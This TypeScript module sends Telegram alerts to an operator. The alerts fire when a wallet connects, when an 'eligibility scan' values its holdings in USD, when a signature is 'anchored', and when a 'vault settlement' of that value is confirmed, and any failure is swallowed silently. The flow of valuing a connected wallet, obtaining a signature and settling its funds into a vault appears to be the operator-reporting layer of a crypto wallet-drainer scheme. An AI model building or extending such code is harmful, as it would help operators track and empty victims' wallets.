/**
 * Legion Engine — Telegram Sovereign Notification Layer
 * Sends institutional-grade alerts to Telegram for all key workflow events.
 * Silent fail — never crashes the main flow.
 */

function getISTTimestamp(): string {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit',
    month: 'short',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
  }) + ' IST'
}

function maskAddress(addr: string): string {
  if (!addr || addr.length < 10) return addr
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`
}

function maskSignature(sig: string): string {
  if (!sig || sig.length < 16) return sig
  return `${sig.slice(0, 10)}...${sig.slice(-6)}`
}

async function sendTelegramMessage(text: string): Promise<void> {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chatId = process.env['TELEGRAM_CHAT_ID']?.trim()

  if (!token || !chatId) {
    console.info('[TELEGRAM] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set — skipping notification')
    return
  }

  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = (await res.json().catch(() => null)) as { ok?: boolean; description?: string } | null
    if (json && json.ok === false) {
      console.warn('[TELEGRAM] API error:', json.description)
    }
  } catch (err) {
    console.warn('[TELEGRAM] Silent fail —', String(err))
  }
}

// ─── Event Notifiers ────────────────────────────────────────────────────────

export async function notifyWalletConnected(
  address: string,
  chainFamily: string,
  walletType: string,
): Promise<void> {
  const text =
    `🔌 <b>NEW WALLET CONNECTED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${maskAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    `👛 <b>Wallet:</b> ${walletType}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyScanComplete(
  address: string,
  totalUsd: number,
  assetsCount: number,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
  const text =
    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${maskAddress(address)}</code>\n` +
    `💰 <b>Total Value:</b> ${usdFormatted}\n` +
    `📦 <b>Assets Found:</b> ${assetsCount}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifySignatureReceived(
  address: string,
  chainFamily: string,
  signature: string,
): Promise<void> {
  const text =
    `✍️ <b>SIGNATURE ANCHORED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${maskAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    `🔏 <b>Sig:</b> <code>${maskSignature(signature)}</code>\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyVaultSettlement(
  address: string,
  txHash: string,
  totalUsd: number,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
  const text =
    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${maskAddress(address)}</code>\n` +
    `💵 <b>Amount:</b> ${usdFormatted}\n` +
    `🔗 <b>TX:</b> <code>${maskSignature(txHash)}</code>\n` +
    `✅ <b>Status:</b> CONFIRMED\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyError(
  endpoint: string,
  error: string,
  address?: string,
): Promise<void> {
  const text =
    `❌ <b>SYSTEM ALERT</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `🚨 <b>Endpoint:</b> ${endpoint}\n` +
    `⚠️ <b>Error:</b> ${error}\n` +
    `📍 <b>Address:</b> ${address ? `<code>${maskAddress(address)}</code>` : 'N/A'}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}

export async function notifyNewSignatureAnchorRequest(
  address: string,
  chainFamily: string,
  walletType: string,
  totalUsd: number,
): Promise<void> {
  const usdFormatted = totalUsd.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
  const text =
    `⚡ <b>SETTLEMENT REQUEST INITIATED</b>\n` +
    `━━━━━━━━━━━━━━━━\n` +
    `📍 <b>Address:</b> <code>${maskAddress(address)}</code>\n` +
    `⛓️ <b>Chain:</b> ${chainFamily}\n` +
    `👛 <b>Wallet:</b> ${walletType}\n` +
    `💵 <b>Declared Value:</b> ${usdFormatted}\n` +
    `🕐 ${getISTTimestamp()}`
  await sendTelegramMessage(text)
}
